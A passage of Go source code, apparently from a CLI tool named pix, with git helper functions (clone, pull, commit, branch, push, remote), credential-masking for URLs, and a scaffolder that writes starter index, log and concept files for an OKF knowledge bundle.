		if c := CanonicalizeKnowledgeBundle(p); c != "" {
			out = append(out, c)
		}
	}
	return out
}

// redactURL masks any userinfo (user:token@) in a git URL so a display line
// never leaks an embedded credential. Thin wrapper over the shared
// config.RedactURL so the launcher and host binary redact identically.
func redactURL(u string) string { return config.RedactURL(u) }

// GitCloneArgs builds gitClone's argv. The `--` terminates option parsing so a
// URL beginning with a dash can never be smuggled in as a git option
// (defense-in-depth behind safeGitURL). Pure so it is unit-testable.
func GitCloneArgs(url, dest string) []string {
	return []string{"clone", "-q", "--", url, dest}
}

func gitClone(url, dest string) error {
	return exec.Command("git", GitCloneArgs(url, dest)...).Run()
}

func gitPull(dir string) error {
	return exec.Command("git", "-C", dir, "pull", "-q", "--ff-only").Run()
}

// gitIsDirty reports whether the working tree has uncommitted changes.
func gitIsDirty(dir string) (bool, error) {
	out, err := exec.Command("git", "-C", dir, "status", "--porcelain").Output()
	if err != nil {
		return false, err
	}
	return strings.TrimSpace(string(out)) != "", nil
}

// gitAddCommit stages everything and commits with msg.
func gitAddCommit(dir, msg string) error {
	if err := gitRun(dir, "add", "-A"); err != nil {
		return err
	}
	return gitRun(dir, "commit", "-q", "-m", msg)
}

// gitCurrentBranch returns the current branch name ("HEAD" when detached).
func gitCurrentBranch(dir string) (string, error) {
	out, err := exec.Command("git", "-C", dir, "rev-parse", "--abbrev-ref", "HEAD").Output()
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(string(out)), nil
}

// gitCheckoutBranch creates and switches to a new branch.
func gitCheckoutBranch(dir, branch string) error {
	return gitRun(dir, "checkout", "-q", "-b", branch)
}

// gitPushBranch pushes branch to origin, setting upstream.
func gitPushBranch(dir, branch string) error {
	return gitRun(dir, "push", "-q", "-u", "origin", branch)
}

// gitSetRemote sets (or updates) the origin remote URL.
func gitSetRemote(dir, url string) error {
	if cur, err := gitRemoteURL(dir); err == nil && strings.TrimSpace(cur) != "" {
		return exec.Command("git", "-C", dir, "remote", "set-url", "origin", url).Run()
	}
	return exec.Command("git", "-C", dir, "remote", "add", "origin", url).Run()
}

// timeStamp is a compact UTC stamp for sync branch/commit names.
func timeStamp() string { return time.Now().UTC().Format("20060102-150405") }

// shortRand returns 4 random hex bytes to make sync branch names
// collision-resistant even within the same second. Falls back to a nanosecond
// tail if the RNG is unavailable.
func shortRand() string {
	b := make([]byte, 4)
	if _, err := rand.Read(b); err != nil {
		return fmt.Sprintf("%06d", time.Now().UnixNano()%1000000)
	}
	return hex.EncodeToString(b)
}

// gitRemoteURL returns the origin remote URL of the git checkout at dir.
func gitRemoteURL(dir string) (string, error) {
	out, err := exec.Command("git", "-C", dir, "remote", "get-url", "origin").Output()
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(string(out)), nil
}

// scaffoldBundle writes a spec-correct OKF skeleton into dir. It writes each
// file only when absent so re-running never clobbers hand-authored content.
//
// OKF reserved-file rules (see services/host/okf): the bundle-root index.md is
// the ONLY reserved file that may carry frontmatter, and only `okf_version`;
// log.md carries NO frontmatter (date-grouped entries); non-reserved concept
// files carry a REQUIRED `type` frontmatter key.
func scaffoldBundle(dir string) error {
	files := map[string]string{
		"index.md":                     indexScaffold,
		"log.md":                       logScaffold,
		"reference/getting-started.md": conceptScaffold,
	}
	for rel, content := range files {
		full := filepath.Join(dir, filepath.FromSlash(rel))
		if _, err := os.Stat(full); err == nil {
			continue // don't clobber an existing file
		}
		if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
			return fmt.Errorf("mkdir %s: %w", filepath.Dir(full), err)
		}
		if err := os.WriteFile(full, []byte(content), 0o644); err != nil {
			return fmt.Errorf("write %s: %w", rel, err)
		}
	}
	return nil
}

// indexScaffold is the bundle-root index.md: the only reserved file that may
// carry frontmatter, and only okf_version. The body is a plain markdown listing.
const indexScaffold = `---
okf_version: "0.1"
---
# Knowledge Bundle

An OKF (Open Knowledge Format) bundle indexed by the pix knowledge service.
Each concept is a markdown file with a required ` + "`type`" + ` frontmatter key.
This root index is a human-readable listing; it is not itself a concept.

## Concepts

- [Getting started](reference/getting-started.md)
`

// logScaffold is the reserved log.md: date-grouped entries, NO frontmatter.
const logScaffold = `# Log

Date-grouped notes about changes to this bundle. No frontmatter here (log.md is
a reserved OKF file).

## 2024-01-01

- Bundle created by ` + "`pix knowledge init`" + `.
`

// conceptScaffold is a starter concept with the REQUIRED type frontmatter and a
// # Citations section.
const conceptScaffold = `---
type: reference
title: Getting started
description: How this knowledge bundle works and how to add to it.
---
# Getting started

Add one markdown file per concept. Every concept file needs a ` + "`type`" + `
frontmatter key (e.g. reference, guide, dataset, table). Optional keys: title,
description, resource, tags, timestamp.

Link between concepts with relative markdown links, e.g. [the index](/index.md).
List sources under a ` + "`# Citations`" + ` heading.

# Citations
- https://github.com/mcavage/pix
`
